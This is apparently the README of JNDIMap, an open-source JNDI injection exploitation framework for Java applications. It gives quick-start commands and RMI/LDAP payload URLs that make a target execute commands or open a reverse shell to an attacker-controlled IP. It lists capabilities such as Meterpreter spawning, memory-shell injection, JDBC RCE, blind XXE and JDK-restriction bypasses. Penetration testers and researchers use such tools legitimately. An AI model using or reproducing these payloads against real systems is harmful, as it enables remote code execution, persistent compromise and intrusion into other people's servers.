<div align="center">
    <img src="img/logo.png" width="128" />
    <h1 align="center">JNDIMap</h1>
</div>

<p align="center">
<img alt="GitHub Repo stars" src="https://img.shields.io/github/stars/X1r0z/JNDIMap">
<img alt="GitHub forks" src="https://img.shields.io/github/forks/X1r0z/JNDIMap">
<img alt="Static Badge" src="https://img.shields.io/badge/Java-8-blue">
<img alt="GitHub Downloads (all assets, all releases)" src="https://img.shields.io/github/downloads/X1r0z/JNDIMap/total">
<img alt="GitHub Release" src="https://img.shields.io/github/v/release/X1r0z/JNDIMap">
<img alt="GitHub License" src="https://img.shields.io/github/license/X1r0z/JNDIMap">

<p align="center">
JNDIMap is a powerful JNDI injection exploitation framework that supports RMI, LDAP and LDAPS protocols, including various bypass methods for high-version JDK restrictions
</p>
<p align="center"><a href="README.md">简体中文</a> | English</p>
</p>

## 🚀 Quick Start

Download JNDIMap from the [Release](https://github.com/X1r0z/JNDIMap/releases) page, and pass the `-i` parameter to specify the external IP when running

```bash
java -jar JNDIMap-version.jar -i 10.0.0.1
```

Execute command or reverse shell on the target machine

```bash
rmi://10.0.0.1:1099/Basic/Command/open -a Calculator
ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
```

## 🚩 Features

- DNSLog
- Command execution
- Spawn reverse shell
- Spawn Meterpreter 
- Load custom Java bytecode
- MemShell injection (based on [MemShellParty](https://github.com/ReaJason/MemShellParty))
- High version JDK Bypass
  - BeanFactory Bypass (Tomcat/Groovy/XStream, etc.)
  - JDBC RCE (MySQL/PostgreSQL/H2/Derby)
  - Tomcat Blind XXE
- LDAP Deserialization (including common gadgets)
- Customize payload based on Nashorn JS engine
- UTF-8 Overlong Encoding Bypass

## 📖 Documentation

> Full documentation: [USAGE.en.md](USAGE.en.md)

- [Usage](USAGE.en.md#usage)
- [URL Format](USAGE.en.md#url-format)
- [Basic Functions](USAGE.en.md#basic-functions)
- [MemShell Injection](USAGE.en.md#memshell-injection)
- [BeanFactory Bypass](USAGE.en.md#beanfactory-bypass)
  - [Tomcat ELProcessor](USAGE.en.md#tomcat-elprocessor)
  - [Groovy ClassLoader/Shell](USAGE.en.md#groovy-classloadershell)
  - [XStream](USAGE.en.md#xstream)
  - [SnakeYaml](USAGE.en.md#snakeyaml)
  - [BeanShell](USAGE.en.md#beanshell)
  - [MVEL](USAGE.en.md#mvel)
  - [MLet](USAGE.en.md#mlet)
  - [NativeLibLoader](USAGE.en.md#nativelibloader)
- [JDBC RCE](USAGE.en.md#jdbc-rce)
  - [MySQL](USAGE.en.md#mysql)
    - [MySQL JDBC Deserialization RCE](USAGE.en.md#mysql-jdbc-deserialization-rce)
    - [MySQL Client Arbitrary File Read](USAGE.en.md#mysql-client-arbitrary-file-read)
  - [PostgreSQL](USAGE.en.md#postgresql)
  - [H2 Database](USAGE.en.md#h2)
  - [Apache Derby](USAGE.en.md#derby)
    - [Derby SQL RCE](USAGE.en.md#derby-sql-rce)
    - [Derby Master-Slave Replication Deserialization RCE](USAGE.en.md#derby-master-slave-replication-deserialization-rce)
- [Tomcat Blind XXE](USAGE.en.md#tomcat-blind-xxe)
- [LDAP Deserialization](USAGE.en.md#ldap-deserialization)
- [Script](USAGE.en.md#script)
- [Advanced Techniques](USAGE.en.md#advanced-techniques)
  - [Use Reference Only](USAGE.en.md#use-reference-only)
  - [Confusing Class Name](USAGE.md#confusing-class-name)
  - [JShell Payload](USAGE.en.md#jshell-payload)
  - [UTF-8 Overlong Encoding](USAGE.en.md#utf-8-overlong-encoding)

## ⚙️ Compile

The version of [Releases](https://github.com/X1r0z/JNDIMap/releases) may be outdated, it is recommended to pull the source code and compile it yourself when using it (based on JDK 8)

```bash
git clone https://github.com/X1r0z/JNDIMap && cd JNDIMap
mvn package -Dmaven.test.skip=true
```

## 📷 References & Acknowledgements

[https://tttang.com/archive/1405/](https://tttang.com/archive/1405/)

[https://paper.seebug.org/1832/](https://paper.seebug.org/1832/)

[https://xz.aliyun.com/t/12846](https://xz.aliyun.com/t/12846)

[http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce](http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce)

[https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson 与原生反序列化/](https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/)

[https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson 与原生反序列化-二/](https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/)

[https://www.yulegeyu.com/2022/11/12/Java 安全攻防之老版本 Fastjson 的一些不出网利用/](https://www.yulegeyu.com/2022/11/12/Java%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E4%B9%8B%E8%80%81%E7%89%88%E6%9C%ACFastjson-%E7%9A%84%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/)

[https://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/](https://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/)

[https://www.leavesongs.com/PENETRATION/use-tls-proxy-to-exploit-ldaps.html](https://www.leavesongs.com/PENETRATION/use-tls-proxy-to-exploit-ldaps.html)

[https://exp10it.io/2025/03/h2-rce-in-jre-17/](https://exp10it.io/2025/03/h2-rce-in-jre-17/)

[https://forum.butian.net/share/4414](https://forum.butian.net/share/4414)

[https://yzddmr6.com/posts/swinglazyvalue-in-webshell/](https://yzddmr6.com/posts/swinglazyvalue-in-webshell/)

[https://mogwailabs.de/en/blog/2024/12/jndi-mind-tricks/](https://mogwailabs.de/en/blog/2024/12/jndi-mind-tricks/)

[https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html](https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html)

[https://github.com/Whoopsunix/utf-8-overlong-encoding](https://github.com/Whoopsunix/utf-8-overlong-encoding)

## 🌟 Star History

<a href="https://www.star-history.com/#X1r0z/JNDIMap&Date">
 <picture>
   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=X1r0z/JNDIMap&type=Date&theme=dark" />
   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=X1r0z/JNDIMap&type=Date" />
   <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=X1r0z/JNDIMap&type=Date" />
 </picture>
</a>